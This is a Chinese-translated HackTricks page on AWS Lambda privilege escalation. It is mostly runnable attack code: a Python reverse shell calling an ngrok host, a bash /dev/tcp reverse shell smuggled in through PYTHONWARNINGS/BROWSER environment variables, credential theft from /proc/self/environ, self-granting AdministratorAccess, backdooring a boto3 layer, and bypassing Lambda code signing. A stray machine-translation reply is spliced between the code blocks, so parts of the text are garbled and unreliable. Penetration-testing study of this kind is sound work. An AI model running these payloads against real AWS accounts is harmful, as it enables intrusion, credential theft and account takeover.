# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

More info about lambda in:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

拥有 **`iam:PassRole`、`lambda:CreateFunction` 和 `lambda:InvokeFunction`** 权限的用户可以提升他们的权限。\
他们可以 **创建一个新的 Lambda function 并将其分配给现有的 IAM role**，从而赋予该函数与该角色关联的权限。然后用户可以 **为该 Lambda function 编写并上传代码（例如包含 rev shell）**。\
一旦函数设置完成，用户可以通过 AWS API 调用该 Lambda function 来 **触发其执行** 并执行预期的操作。该方法实际上允许用户以与该 IAM role 关联的权限级别，间接通过 Lambda function 执行任务。\\

攻击者可能滥用此方法以获得 **rev shell 并窃取 token**：
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
你也可以从 lambda function 本身**滥用 lambda role permissions**.\
如果 lambda role 拥有足够的权限，你可以用它给自己授予管理员权限：
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
也可以在不需要外部连接的情况下 leak lambda 的角色凭证。对于用于内部任务的 **Network isolated Lambdas**，这会很有用。如果有未知的 security groups 正在过滤你的 reverse shells，这段代码将允许你直接 leak 凭证作为 lambda 的输出。
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**潜在影响：** 直接对指定的任意 lambda 服务角色执行权限提升。

> [!CAUTION]
> 注意，尽管 **`lambda:InvokeAsync`** 看起来很有用，但它本身并不允许执行 **`aws lambda invoke-async`**，你还需要 `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

像在之前的场景中一样，如果你拥有 **`lambda:AddPermission`** 权限，你可以**给自己授予 `lambda:InvokeFunction` 权限**。
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** 直接对指定的任意 lambda 服务角色造成 privesc。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

具有 **`iam:PassRole`、`lambda:CreateFunction` 和 `lambda:CreateEventSourceMapping`** 权限的用户（并可能还具有 `dynamodb:PutItem` 和 `dynamodb:CreateTable`）即使没有 `lambda:InvokeFunction`，也可以间接 **escalate privileges**。\
他们可以创建一个带有恶意代码的 **Lambda function 并将其分配给现有的 IAM role**。

用户不会直接调用 Lambda，而是设置或使用现有的 DynamoDB 表，通过 event source mapping 将其与 Lambda 关联。该配置确保 Lambda function **在表中插入新项时自动触发**，无论是由用户的操作还是其他进程触发，从而间接调用 Lambda function 并以传递的 IAM role 的权限执行代码。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
如果 DynamoDB 已经在 AWS 环境中启用，用户只需要为 Lambda 函数**建立 event source mapping**。但是，如果未使用 DynamoDB，用户必须**创建一个启用 DynamoDB Streams 的新表**：
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
现在可以通过**creating an event source mapping**将**the Lambda function**连接到**the DynamoDB table**：
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
当 Lambda 函数与 DynamoDB stream 关联时，攻击者可以通过**激活 DynamoDB stream 来间接触发 Lambda**。这可以通过**向 DynamoDB table 插入一条记录**来完成：
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** 直接对指定的 lambda 服务角色 进行 privesc。

### `lambda:AddPermission`

具有此权限的攻击者可以 **为自己（或他人）授予任何权限**（这会生成基于资源的策略来授予对该资源的访问）：
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potential Impact:** 通过授予修改代码并运行的权限，直接对所使用的 lambda service role 执行 privesc。

### `lambda:AddLayerVersionPermission`

拥有此权限的攻击者可以 **授予自己（或他人）权限 `lambda:GetLayerVersion`**。他可以访问该 layer 并搜索漏洞或敏感信息
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** 潜在访问敏感信息。

### `lambda:UpdateFunctionCode`

拥有 **`lambda:UpdateFunctionCode`** 权限的用户有可能 **修改与 IAM 角色关联的现有 Lambda 函数的代码。**\
攻击者可以**修改 lambda 的代码以 exfiltrate the IAM credentials**。

尽管攻击者可能没有直接调用该 Lambda function 的能力，如果该 Lambda function 已经存在且处于运行状态，很可能会通过现有的工作流或事件被触发，从而间接促成修改后代码的执行。
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**潜在影响：** 对所使用的 lambda 服务角色的直接 privesc。

### `lambda:UpdateFunctionConfiguration`

#### 通过环境变量实现 RCE

拥有此权限，可以添加环境变量，使 Lambda 执行任意代码。例如在 python 中可以滥用环境变量 `PYTHONWARNING` 和 `BROWSER` 使 python 进程执行任意命令：
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
对于其他脚本语言，有其他可以使用的 env variables。更多信息请查看脚本语言的小节：

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE 通过 Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) 允许在你的 lamdba 函数中包含 **code**，但**单独存储它**，这样函数代码可以保持精简，并且**多个函数可以共享 code**。

在 lambda 内，你可以通过如下函数检查 python code 的加载路径：
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
这些位置：

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

例如，库 boto3 从 `/var/runtime/boto3` 加载（第4个位置）。

#### 利用

可以滥用权限 `lambda:UpdateFunctionConfiguration` 来**添加一个新的 layer**到一个 lambda 函数。为了执行任意代码，这个 layer 需要包含一些 **lambda 将要导入的库。** 如果你能读取该 lambda 的代码，就能很容易找到这一点。另外请注意，该 lambda 可能**已经在使用一个 layer**，你也可能**下载**该 layer 并**在其中添加你的代码**。

例如，假设该 lambda 正在使用库 boto3，这将创建一个包含该库最新版本的本地 layer：
```bash
pip3 install -t ./lambda_layer boto3
```
你可以打开 `./lambda_layer/boto3/__init__.py` 并 **add the backdoor in the global code**（例如一个函数用于 exfiltrate credentials 或 get a reverse shell）。

然后，将 `./lambda_layer` 目录 zip 打包并 **upload the new lambda layer** 到你自己的账号（或受害者的账号，但你可能没有权限）。\
注意，你需要创建一个 python 文件夹并将库放在其中以覆盖 /opt/python/boto3。此外，该 layer 需要与 lambda 使用的 **python version** 兼容，如果你将其上传到你的账号，它需要位于 **same region**：
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
现在，使已上传的 lambda layer **对任何账户可访问**：
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
然后将 lambda layer 附加到受害者的 lambda function：
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
下一步要么是我们自己 **invoke the function**（如果可以的话）要么等待直到 **它被触发**（通过正常途径）——后者更安全。

A **更隐蔽的利用该漏洞的方法** 可以在以下位置找到：

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**潜在影响：** 直接对所使用的 lambda service role 的 privesc。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

也许拥有这些权限你可以创建一个 function 并通过调用 URL 来执行它……但我没找到验证方法，所以如果你试出来记得告诉我！

### Lambda MitM

某些 lambda 会**在参数中接收用户的敏感信息。** 如果在其中一个获得了 RCE，你可以窃取其他用户发送给该函数的信息，详情见：

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## 参考资料

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

如果一个 Lambda function 强制启用了代码签名（code signing），能够删除 Code Signing Config (CSC) 或将其降级为 Warn 的攻击者可以向该函数部署未签名的代码。这在不修改函数 IAM role 或触发器的情况下绕过了完整性保护。

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- 对于 Path B，如果 CSC 策略设置为 `WARN`（允许未签名的 artifact），则不需要 AWS Signer profile。

步骤 (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

准备一个小的 payload：
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
路径 A) 移除 CSC 然后更新 code:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
路径 B) 降级为 Warn 并更新代码 (如果不允许删除):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
已收到。确认将按要求翻译指定文件的相关英文为中文，保持原有 Markdown/HTML 语法不变；不翻译代码、技术名词、常见攻防词、云平台名、链接/路径和标签；不添加额外内容。请提供要翻译的文件内容。
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
潜在影响：能够将任意未签名代码推送并在本应强制签名部署的函数中运行，可能导致以该函数角色的权限执行代码。

Cleanup:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

